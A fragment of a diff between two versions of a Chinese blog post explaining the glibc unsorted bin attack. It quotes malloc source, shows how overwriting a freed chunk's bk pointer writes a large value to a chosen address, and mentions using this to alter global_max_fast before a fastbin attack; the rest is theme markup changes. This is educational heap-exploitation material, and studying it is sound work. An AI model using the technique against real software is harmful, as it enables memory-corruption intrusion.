- nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             &#123;<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             &#125;<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     &#123;<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #显然，bck被修改，并不符合这里的要求<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         &#123;<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             &#123;<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             &#125;<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，<strong>victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方<br>实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备<br><br>我们准备把这个地方 <span class="hljs-number">0x7fff7b5eecf8</span> 的值 <span class="hljs-number">0</span> 更改为一个很大的数<br><br>一开始先申请一个比较正常的 chunk: <span class="hljs-number">0x24d0010</span><br>再分配一个避免与 top chunk 合并<br><br>当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 <span class="hljs-number">0x7f691338eb78</span><br>现在假设有个漏洞，可以让我们修改 <span class="hljs-built_in">free</span> 了的 chunk 的 bk 指针<br>我们把目标地址（想要改为超大值的那个地方）减去 <span class="hljs-number">0x10</span> 写到 bk 指针:<span class="hljs-number">0x7fff7b5eece8</span><br><br>再去 <span class="hljs-built_in">malloc</span> 的时候可以发现那里的值已经改变为 unsorted bin 的地址<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>这里我们可以看到 <strong>unsorted bin attack 确实可以修改任意地址的值</strong>，<strong>但是所修改成的值却不受我们控制</strong>，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说<br>● <strong>我们通过修改循环的次数来使得程序可以执行多次循环。</strong><br><strong>●</strong> <strong>我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。</strong></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉全篇看最后一句话就够了(哈哈哈)</p>
@@ -375,91 +707,378 @@
 <p>target_addr：目标地址（想要修改为超大数的地址） </p>
 </blockquote>
 
-    </div>
+		</div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/unsoted-bin-attack/" rel="tag"># unsoted bin attack</a>
-          </div>
-
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> unsorted bin</li>
+        <li><strong>作者:</strong> Kylinxin</li>
+        <li><strong>创建于
+                :</strong> 2023-07-02 01:58:29</li>
         
+            <li>
+                <strong>更新于
+                    :</strong> 2023-07-02 01:58:29
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://kylinxin.github.io/2023/07/02/unsorted bin attack/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2023/06/25/0ctf_2017_BabyHeap/" rel="prev" title="0ctf_2017_BabyHeap">
-                  <i class="fa fa-angle-left"></i> 0ctf_2017_BabyHeap
-                </a>
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/unsoted-bin-attack/">#unsoted bin attack</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2023/07/09/HITCON%20Training%20lab14%20magic%20heap/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HITCON Training lab14 magic heap</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2023/06/25/0ctf_2017_BabyHeap/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">0ctf_2017_BabyHeap</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">unsorted bin</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eunsorted-bin-%E5%92%8C-unsorted-bin-attack"><span class="nav-text">关于unsorted bin 和 unsorted bin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsotedbin-%E5%9F%BA%E6%9C%AC%E6%9D%A5%E6%BA%90"><span class="nav-text">unsotedbin 基本来源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E6%A6%82%E8%BF%B0"><span class="nav-text">unsortedbin_attack 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E6%95%88%E6%9E%9C"><span class="nav-text">unsortedbin_attack 效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">unsortedbin 源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsortedbin-attack-%E5%8E%9F%E7%90%86"><span class="nav-text">unsortedbin_attack 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E8%B0%83%E8%AF%95"><span class="nav-text">开始调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cunsigned-long-p-x3D-malloc-0x410"><span class="nav-text">执行unsigned long *p&#x3D;malloc(0x410);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cmalloc-500"><span class="nav-text">执行malloc(500);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cfree-p"><span class="nav-text">执行free(p)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cp-1-x3D-unsigned-long-amp-stack-var-2"><span class="nav-text">执行p[1]&#x3D;(unsigned long)(&amp;stack_var-2);</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8Cmalloc-0x410"><span class="nav-text">执行malloc(0x410)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E6%80%9D"><span class="nav-text">反思</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Built with Hexo and Redefine.</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-shield-halved" style="color: #A31F34"></i>&nbsp;&nbsp;<a href="/">Kylinxin</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 60 篇文章
+                    </span>
+                    
+                        <span>
+                            共 132k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
             </div>
-            <div class="post-nav-item">
-                <a href="/2023/07/09/HITCON%20Training%20lab14%20magic%20heap/" rel="next" title="HITCON Training lab14 magic heap">
-                  HITCON Training lab14 magic heap <i class="fa fa-angle-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
 </div>
 
 
-
-
-
-
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-  </main>
+	
 
-  <footer class="footer">
-    <div class="footer-inner">
+</main>
 
-  <div class="copyright">
-    &copy; 2023 – 
-    <span itemprop="copyrightYear">2026</span>
-    <span class="with-love">
-      <i class="fa fa-heart"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">true</span>
-  </div>
-<div class="wordcount">
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-chart-line"></i>
-    </span>
-      <span>站点总字数：</span>
-    <span title="站点总字数">349k</span>
-  </span>
-  <span class="post-meta-item">
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-      <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">21:11</span>
-  </span>
-</div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
 
-    </div>
-  </footer>
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
 
   
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-  <div class="sidebar-dimmer"></div>
-  <div class="back-to-top" role="button" aria-label="返回顶部">
-    <i class="fa fa-arrow-up fa-lg"></i>
-    <span>0%</span>
-  </div>
+<script src="/js/build/libs/Typed.min.js"></script>
 
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
 
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+    
+<script src="/js/build/libs/pangu.min.js"></script>
+
+
+
+	
 </body>
+
 </html>
